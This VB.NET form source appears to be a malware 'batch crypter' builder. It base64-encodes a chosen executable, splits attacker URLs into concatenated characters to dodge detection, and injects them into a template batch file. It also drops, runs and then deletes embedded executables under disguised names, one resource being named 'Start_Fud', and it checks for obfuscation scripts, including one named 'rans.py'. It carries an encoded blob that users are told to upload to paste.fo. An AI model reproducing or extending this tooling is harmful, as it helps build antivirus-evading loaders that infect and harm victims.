Imports System.IO
Imports System.Text
Imports System.Environment
Imports Microsoft.Win32

Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        formLoad()
    End Sub
    Private Sub HexButton1_Click(sender As Object, e As EventArgs) Handles HexButton1.Click
        RichTextBox1.Text = "FRANEREdBAtZPwoMGRAELRAXEEUYf29US0VZIwQREwhUQ0EUHAEسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسس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"
        MsgBox("Plese Upload This Strings to paste.fo")
    End Sub
    Private Sub HexButton3_Click(sender As Object, e As EventArgs) Handles HexButton3.Click
        RichTextBox1.SelectAll()
        RichTextBox1.Copy()
    End Sub
    Public Function Encrypt2(ByVal input As String, ByVal Key1 As String, ByVal Key2 As Integer)
        Try
            Dim x As Int64
            Dim y As Integer = -555

            For i = 1 To input.Length Step 1

                x = AscW(Mid(input, i)) + CUInt(Key1 + Key2 Mod y)

                Encrypt2 = Encrypt2 & ChrW(x)

            Next
        Catch ex As Exception
        End Try
    End Function
    Private Sub HexButton2_Click(sender As Object, e As EventArgs) Handles HexButton2.Click
        'Dim e1 As New OpenFileDialog

        'e1.Filter = "(*.EXE)|*.EXE"

        'If e1.ShowDialog = Windows.Forms.DialogResult.OK Then

        '    HexTextBox1.Text = e1.FileName

        'End If
        'RichTextBox2.Text = (Convert.ToBase64String(IO.File.ReadAllBytes(HexTextBox1.Text)))
        Dim openFileDialog As New OpenFileDialog()
        ' تحديد الخيارات الإضافية إذا لزم الأمر
        openFileDialog.Title = "اختر ملفًا"
        'openFileDialog.Filter = "ملفات التنفيذ (.exe)|.exe"
        'openFileDialog.Filter = "ملفات التنفيذ |.exe"
        openFileDialog.InitialDirectory = ""

        ' عرض نافذة اختيار الملف
        If openFileDialog.ShowDialog() = DialogResult.OK Then
            ' الحصول على مسار الملف المحدد
            Dim selectedFilePath As String = openFileDialog.FileName
            'pa = RichTextBox3.Text
            ' استخدام مسار الملف كما تحتاج
            'Guna2HtmlLabel1.Text = selectedFilePath

            Dim text As String = Convert.ToBase64String(File.ReadAllBytes(selectedFilePath))
            Me.RichTextBox2.Text = text
        Else
            ' Guna2HtmlLabel1.Text = "choose Server"
        End If
    End Sub
    Private Sub HexButton4_Click(sender As Object, e As EventArgs) Handles HexButton4.Click
        RichTextBox2.SelectAll()
        RichTextBox2.Copy()
    End Sub
#Region "SP Sub"
    Public Sub sp(ByVal maze As String, ByVal hi As String)
#Region "تقسيم الرابط"
        Dim inputText As String = maze

        ' وضع كل حرف داخل ""
        Dim charactersArray() As String = inputText.Select(Function(c) c.ToString()).ToArray()

        Dim f As String = (String.Join(" + ", charactersArray.Select(Function(c) """" & c & """")))
        RichTextBox3.Text = My.Resources.code.Replace("%%%FirstURL%%%", f)

        Dim input2 As String = hi
        Dim charactersArray2() As String = input2.Select(Function(c1) c1.ToString()).ToArray()
        Dim y As String = (String.Join(" + ", charactersArray2.Select(Function(c1) """" & c1 & """")))
        RichTextBox3.Text = (RichTextBox3.Text).Replace("%%%Sec URL%%%", y)
#End Region
#Region "Randowm String"
        Try
            If HexTextBoxRandowm1.Text.Length = 0 OrElse
               HexTextBoxRandowm2.Text.Length = 0 OrElse
               HexTextBoxRandowm3.Text.Length = 0 OrElse
               HexTextBoxRandowm4.Text.Length = 0 Then
                MessageBox.Show("Please fill in all TextBox controls before generating the file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If

            Dim stellervbs1 As String = RichTextBox3.Text
            stellervbs1 = stellervbs1.Replace("%%%Randowm1%%%", HexTextBoxRandowm1.Text)
            stellervbs1 = stellervbs1.Replace("%%%Randowm2%%%", HexTextBoxRandowm2.Text)
            stellervbs1 = stellervbs1.Replace("%%%Randowm3%%%", HexTextBoxRandowm3.Text)
            stellervbs1 = stellervbs1.Replace("%%%Randowm4%%%", HexTextBoxRandowm4.Text)
            RichTextBox3.Text = stellervbs1


            MessageBox.Show("File successfully created.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Catch ex As Exception
            MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
#End Region
    End Sub
#End Region
    Private Sub HexButton5_Click(sender As Object, e As EventArgs) Handles HexButton5.Click
        sp(HexTextBox1.Text, HexTextBox2.Text)
    End Sub
    Public Sub Randwommmmmm()
        Dim characters As String = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
        ' Random number generator
        Dim rand As New Random()
        ' Length of the random string
        Dim totalLength As Integer = 55
        ' StringBuilder to build the random string
        Dim resultStringBuilder As New StringBuilder()
        ' Generate the random string
        For i As Integer = 1 To totalLength
            Dim randomIndex As Integer = rand.Next(0, characters.Length)
            resultStringBuilder.Append(characters(randomIndex))
        Next
        ' Get the random string
        Dim randomString As String = resultStringBuilder.ToString()
        ' Assuming HexTextBoxRandowm1 to HexTextBoxRandowm4 are your HexTextBox controls
        ' Split the random string into four parts
        Dim partLength As Integer = totalLength \ 4
        Dim part1 As String = randomString.Substring(0, partLength)
        Dim part2 As String = randomString.Substring(partLength, partLength)
        Dim part3 As String = randomString.Substring(partLength * 2, partLength)
        Dim part4 As String = randomString.Substring(partLength * 3, partLength)
        ' Assign each part to the corresponding HexTextBox
        HexTextBoxRandowm1.Text = part1
        HexTextBoxRandowm2.Text = part2
        HexTextBoxRandowm3.Text = part3
        HexTextBoxRandowm4.Text = part4
    End Sub
    Private Sub HexButton6_Click(sender As Object, e As EventArgs) Handles HexButton6.Click
        RichTextBox3.SelectAll()
        RichTextBox3.Copy()
        System.Threading.Thread.Sleep(300)
        RichTextBox3.Clear()
    End Sub
    Private Sub HexTextBoxRandowm1_MouseMove(sender As Object, e As MouseEventArgs) Handles HexTextBoxRandowm1.MouseMove
        Randwommmmmm()
    End Sub
    Private Sub HexTextBoxRandowm2_MouseMove(sender As Object, e As MouseEventArgs) Handles HexTextBoxRandowm2.MouseMove
        Randwommmmmm()
    End Sub

    Private Sub HexTextBoxRandowm3_MouseMove(sender As Object, e As MouseEventArgs) Handles HexTextBoxRandowm3.MouseMove
        Randwommmmmm()
    End Sub
    Private Sub HexTextBoxRandowm4_MouseMove(sender As Object, e As MouseEventArgs) Handles HexTextBoxRandowm4.MouseMove
        Randwommmmmm()
    End Sub
    Private Sub HexButton7_Click(sender As Object, e As EventArgs) Handles HexButton7.Click
        Try
            ' Ensure HexTextBox controls have valid values
            If HexTextBox3.Text.Length = 0 Then

                MessageBox.Show("Please fill in all HexTextBox controls before generating the file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If
            Dim stellervbs1 As String = My.Resources.Last
            stellervbs1 = stellervbs1.Replace("%%%Last URL%%%", HexTextBox3.Text)
            ' Save the resulting string to a file
            RichTextBox3.Text = stellervbs1

            MessageBox.Show("File successfully created.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Catch ex As Exception
            MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
        System.Threading.Thread.Sleep(1000)
        start_crypter()
    End Sub
#Region "Bath Crypter"
    Dim path = Environment.CurrentDirectory
    Sub start_crypter()
        On Error Resume Next
        Kill("settings.json")
        chic2k()
        System.Threading.Thread.Sleep(300)
        Dim c As New SaveFileDialog
        With c
            .FileName = "MONSTERMCbAT.bat"
            '.Filter = "bat|*.bat"
            '.ShowDialog()
        End With
        System.IO.File.WriteAllText(c.FileName, RichTextBox3.Text)
        System.IO.File.WriteAllBytes("main.py", My.Resources.main)
        System.Threading.Thread.Sleep(700)
        System.IO.File.WriteAllBytes("老于下世下故下s.exe", My.Resources.Start_Fud)
        System.Threading.Thread.Sleep(400)
        If File.Exists(path & "\老于下世下故下s.exe") Then Process.Start(path & "\老于下世下故下s.exe")
        System.Threading.Thread.Sleep(1600)
        Kill("老于下世下故下s.exe")
        Kill("main.py")
        Guna2HtmlLabel2.Text = "Done"
        Kill("settings.json")
    End Sub
    Sub formLoad()
        On Error Resume Next
        Kill("settings.json")
        If Not File.Exists(My.Application.Info.DirectoryPath & "/SDK.txt") Then
            System.IO.File.WriteAllBytes("老世于世下世下故下世s.exe", My.Resources.Pip_Install)
            System.Threading.Thread.Sleep(400)
            System.IO.File.WriteAllBytes("SDK.txt", My.Resources.SDK)
        End If
        Kill("MONSTERMCbAT.bat")
        Kill("MONSTERMCbAT_obf.bat")
        Kill("老于下世下故下s.exe")
        If File.Exists(path & "\老世于世下世下故下世s.exe") Then Process.Start(path & "\老世于世下世下故下世s.exe")
        System.Threading.Thread.Sleep(3900)
        Kill("老世于世下世下故下世s.exe")
        FileExists()
    End Sub
#Region "chickbox"
    Private Sub Guna2CheckBox1_CheckedChanged(sender As Object) Handles Guna2CheckBox1.CheckedChanged
        If Guna2CheckBox1.Checked = True Then
            Guna2TextBox2.Text = "true"
        Else
            Guna2TextBox2.Text = "false"
        End If
    End Sub

    Private Sub Guna2CheckBox2_CheckedChanged(sender As Object) Handles Guna2CheckBox2.CheckedChanged
        If Guna2CheckBox2.Checked = True Then
            Guna2TextBox3.Text = "true"
        Else
            Guna2TextBox3.Text = "false"
        End If
    End Sub
    Private Sub Guna2CheckBox3_CheckedChanged(sender As Object) Handles Guna2CheckBox3.CheckedChanged
        If Guna2CheckBox3.Checked = True Then
            Guna2TextBox4.Text = "true"
        Else
            Guna2TextBox4.Text = "false"
        End If
    End Sub
    Private Sub Guna2CheckBox4_CheckedChanged(sender As Object) Handles Guna2CheckBox4.CheckedChanged
        If Guna2CheckBox4.Checked = True Then
            Guna2CheckBox1.Checked = True
            Guna2CheckBox2.Checked = True
            Guna2CheckBox3.Checked = True
        Else
            Guna2CheckBox1.Checked = False
            Guna2CheckBox2.Checked = False
            Guna2CheckBox3.Checked = False
        End If
    End Sub
    Public Sub chic2k()

        Dim stellervbs1 As String = My.Resources.TestTxt

        stellervbs1 = stellervbs1.Replace("%debug%", (Guna2TextBox2.Text))
        stellervbs1 = stellervbs1.Replace("%chinese%", (Guna2TextBox3.Text))
        stellervbs1 = stellervbs1.Replace("%hidden%", (Guna2TextBox4.Text))
        stellervbs1 = stellervbs1.Replace("%NONE%", (Guna2TextBox5.Text))

        Dim c As New SaveFileDialog
        With c
            .FileName = "settings.json"
            .Filter = "json|*.json"
            '.ShowDialog()
        End With
        System.IO.File.WriteAllText(c.FileName, stellervbs1)
        'MessageBox.Show("successfully : " & c.FileName, "DONE!", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub
#End Region
#Region "File Exists"
    Public Sub FileExists()
        CheickPythonInstaled()
        If Not File.Exists(My.Application.Info.DirectoryPath & "/requirements.txt") Then
            MsgBox("Files Mising 21")
            End
        End If
        If Not File.Exists(My.Application.Info.DirectoryPath & "/util\ui\ui.py") Then
            MsgBox("Files Mising 41")
            End
        End If
        If Not File.Exists(My.Application.Info.DirectoryPath & "/util\supporting\gens.py") Then
            MsgBox("Files Mising 51")
            End
        End If
        If Not File.Exists(My.Application.Info.DirectoryPath & "/util\supporting\settings.py") Then
            MsgBox("Files Mising 61")
            End
        End If
        If Not File.Exists(My.Application.Info.DirectoryPath & "/util\obfuscation\obf_oneline.py") Then
            MsgBox("Files Mising 17")
            End
        End If
        If Not File.Exists(My.Application.Info.DirectoryPath & "/util\obfuscation\obfuscate.py") Then
            MsgBox("Files Mising 18")
            End
        End If
        If Not File.Exists(My.Application.Info.DirectoryPath & "/util\obfuscation\rans.py") Then
            MsgBox("Files Mising 91")
            End
        End If
        If Not File.Exists(My.Application.Info.DirectoryPath & "/util\obfuscation\scrambler.py") Then
            MsgBox("Files Mising 10")
            End
        End If
        If Not File.Exists(My.Application.Info.DirectoryPath & "/util\auto_updating\updater.py") Then
            MsgBox("Files Mising 11")
            End
        End If
    End Sub
#End Region
#End Region
    Sub CheickPythonInstaled()
        Dim folderPath As String = "C:\Users\" & UserName & "\AppData\Local\Programs\Python"

        If FolderExists(folderPath) Then
        Else
            Dim ex As Integer
            ex = MsgBox("Python Mising Want To install Python?", MsgBoxStyle.YesNo, "Python Mising")
            If ex = vbYes Then
                On Error Resume Next
                Dim dir As String = My.Computer.FileSystem.SpecialDirectories.Temp
                Dim filename As String = dir + "python-3.11.4-amd64.dll"
                IO.File.WriteAllBytes(filename, My.Resources.python_3_11_4_amd64)
                Process.Start(filename)

            End If
            End
            'MessageBox.Show("Install Paython Plese", "Python Not Exists", MessageBoxButtons.OK, MessageBoxIcon.Warning)
        End If
    End Sub

    Private Function FolderExists(folderPath As String) As Boolean
        Return Directory.Exists(folderPath)
    End Function
End Class
